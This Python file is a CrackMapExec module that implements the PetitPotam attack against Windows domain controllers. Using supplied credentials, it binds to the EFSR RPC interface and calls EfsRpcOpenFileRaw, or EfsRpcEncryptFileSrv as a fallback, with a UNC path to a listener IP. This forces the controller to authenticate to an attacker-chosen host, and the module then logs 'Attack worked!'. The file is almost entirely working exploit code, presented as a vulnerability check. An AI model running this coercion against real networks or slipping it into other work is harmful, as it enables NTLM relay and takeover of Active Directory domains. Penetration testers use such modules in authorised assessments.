#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# From https://github.com/topotam/PetitPotam
# All credit to @topotam
# Module by @mpgn_x64

import sys

from impacket import system_errors
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import ULONG, WSTR, DWORD, PCHAR, RPC_SID, LPWSTR
from impacket.dcerpc.v5.rpcrt import (
    DCERPCException,
    RPC_C_AUTHN_WINNT,
    RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
    RPC_C_AUTHN_GSS_NEGOTIATE,
)
from impacket.uuid import uuidtup_to_bin


class CMEModule:
    name = "petitpotam"
    description = "Module to check if the DC is vulnerable to PetitPotam, credit to @topotam"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """
        LISTENER            IP of your listener
        PIPE                Default PIPE (default: lsarpc)
        """
        self.listener = "127.0.0.1"
        if "LISTENER" in module_options:
            self.listener = module_options["LISTENER"]
        self.pipe = "lsarpc"
        if "PIPE" in module_options:
            self.pipe = module_options["PIPE"]

    def on_login(self, context, connection):
        dce = coerce(
            connection.username,
            password=connection.password,
            domain=connection.domain,
            lmhash=connection.lmhash,
            nthash=connection.nthash,
            aesKey=connection.aesKey,
            target=connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
            pipe=self.pipe,
            do_kerberos=connection.kerberos,
            dc_host=connection.kdcHost,
            target_ip=connection.host,
            context=context,
        )
        if efs_rpc_open_file_raw(dce, self.listener, context):
            context.log.highlight("VULNERABLE")
            context.log.highlight("Next step: https://github.com/topotam/PetitPotam")
            try:
                host = context.db.get_hosts(connection.host)[0]
                context.db.add_host(
                    host.ip,
                    host.hostname,
                    host.domain,
                    host.os,
                    host.smbv1,
                    host.signing,
                    petitpotam=True,
                )
            except Exception as e:
                context.log.debug(f"Error updating petitpotam status in database")


class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return "EFSR SessionError: code: 0x%x - %s - %s" % (
                self.error_code,
                error_msg_short,
                error_msg_verbose,
            )
        else:
            return "EFSR SessionError: unknown error code: 0x%x" % self.error_code


################################################################################
# STRUCTURES
################################################################################
class EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):
    align = 1
    structure = (("Data", "20s"),)


class EFS_EXIM_PIPE(NDRSTRUCT):
    align = 1
    structure = (("Data", ":"),)


class EFS_HASH_BLOB(NDRSTRUCT):
    structure = (
        ("Data", DWORD),
        ("cbData", PCHAR),
    )


class EFS_RPC_BLOB(NDRSTRUCT):
    structure = (
        ("Data", DWORD),
        ("cbData", PCHAR),
    )


class EFS_CERTIFICATE_BLOB(NDRSTRUCT):
    structure = (
        ("Type", DWORD),
        ("Data", DWORD),
        ("cbData", PCHAR),
    )


class ENCRYPTION_CERTIFICATE_HASH(NDRSTRUCT):
    structure = (
        ("Lenght", DWORD),
        ("SID", RPC_SID),
        ("Hash", EFS_HASH_BLOB),
        ("Display", LPWSTR),
    )


class ENCRYPTION_CERTIFICATE(NDRSTRUCT):
    structure = (
        ("Lenght", DWORD),
        ("SID", RPC_SID),
        ("Hash", EFS_CERTIFICATE_BLOB),
    )


class ENCRYPTION_CERTIFICATE_HASH_LIST(NDRSTRUCT):
    align = 1
    structure = (
        ("Cert", DWORD),
        ("Users", ENCRYPTION_CERTIFICATE_HASH),
    )


class ENCRYPTED_FILE_METADATA_SIGNATURE(NDRSTRUCT):
    structure = (
        ("Type", DWORD),
        ("HASH", ENCRYPTION_CERTIFICATE_HASH_LIST),
        ("Certif", ENCRYPTION_CERTIFICATE),
        ("Blob", EFS_RPC_BLOB),
    )


class ENCRYPTION_CERTIFICATE_LIST(NDRSTRUCT):
    align = 1
    structure = (("Data", ":"),)


################################################################################
# RPC CALLS
################################################################################
class EfsRpcOpenFileRaw(NDRCALL):
    opnum = 0
    structure = (
        ("fileName", WSTR),
        ("Flag", ULONG),
    )


class EfsRpcOpenFileRawResponse(NDRCALL):
    structure = (
        ("hContext", EXIMPORT_CONTEXT_HANDLE),
        ("ErrorCode", ULONG),
    )


class EfsRpcEncryptFileSrv(NDRCALL):
    opnum = 4
    structure = (("FileName", WSTR),)


class EfsRpcEncryptFileSrvResponse(NDRCALL):
    structure = (("ErrorCode", ULONG),)


def coerce(
    username,
    password,
    domain,
    lmhash,
    nthash,
    aesKey,
    target,
    pipe,
    do_kerberos,
    dc_host,
    target_ip=None,
    context=None,
):
    binding_params = {
        "lsarpc": {
            "stringBinding": r"ncacn_np:%s[\PIPE\lsarpc]" % target,
            "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
        },
        "efsr": {
            "stringBinding": r"ncacn_np:%s[\PIPE\efsrpc]" % target,
            "MSRPC_UUID_EFSR": ("df1941c5-fe89-4e79-bf10-463657acf44d", "1.0"),
        },
        "samr": {
            "stringBinding": r"ncacn_np:%s[\PIPE\samr]" % target,
            "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
        },
        "lsass": {
            "stringBinding": r"ncacn_np:%s[\PIPE\lsass]" % target,
            "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
        },
        "netlogon": {
            "stringBinding": r"ncacn_np:%s[\PIPE\netlogon]" % target,
            "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
        },
    }
    rpc_transport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
    if hasattr(rpc_transport, "set_credentials"):
        rpc_transport.set_credentials(
            username=username,
            password=password,
            domain=domain,
            lmhash=lmhash,
            nthash=nthash,
            aesKey=aesKey,
        )

    if target_ip:
        rpc_transport.setRemoteHost(target_ip)

    dce = rpc_transport.get_dce_rpc()
    dce.set_auth_type(RPC_C_AUTHN_WINNT)
    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

    if do_kerberos:
        rpc_transport.set_kerberos(do_kerberos, kdcHost=dc_host)
        dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)

    context.log.info("[-] Connecting to %s" % binding_params[pipe]["stringBinding"])
    try:
        dce.connect()
    except Exception as e:
        context.log.debug("Something went wrong, check error status => %s" % str(e))
        sys.exit()
    context.log.info("[+] Connected!")
    context.log.info("[+] Binding to %s" % binding_params[pipe]["MSRPC_UUID_EFSR"][0])
    try:
        dce.bind(uuidtup_to_bin(binding_params[pipe]["MSRPC_UUID_EFSR"]))
    except Exception as e:
        context.log.debug("Something went wrong, check error status => %s" % str(e))
        sys.exit()
    context.log.info("[+] Successfully bound!")
    return dce


def efs_rpc_open_file_raw(dce, listener, context=None):
    try:
        request = EfsRpcOpenFileRaw()
        request["fileName"] = "\\\\%s\\test\\Settings.ini\x00" % listener
        request["Flag"] = 0
        resp = dce.request(request)

    except Exception as e:
        if str(e).find("ERROR_BAD_NETPATH") >= 0:
            context.log.info("[+] Got expected ERROR_BAD_NETPATH exception!!")
            context.log.info("[+] Attack worked!")
            return True
        if str(e).find("rpc_s_access_denied") >= 0:
            context.log.info("[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!")
            context.log.info("[+] OK! Using unpatched function!")
            context.log.info("[-] Sending EfsRpcEncryptFileSrv!")
            try:
                request = EfsRpcEncryptFileSrv()
                request["FileName"] = "\\\\%s\\test\\Settings.ini\x00" % listener
                resp = dce.request(request)
            except Exception as e:
                if str(e).find("ERROR_BAD_NETPATH") >= 0:
                    context.log.info("[+] Got expected ERROR_BAD_NETPATH exception!!")
                    context.log.info("[+] Attack worked!")
                    return True
                else:
                    context.log.debug("Something went wrong, check error status => %s" % str(e))
        else:
            context.log.debug("Something went wrong, check error status => %s" % str(e))
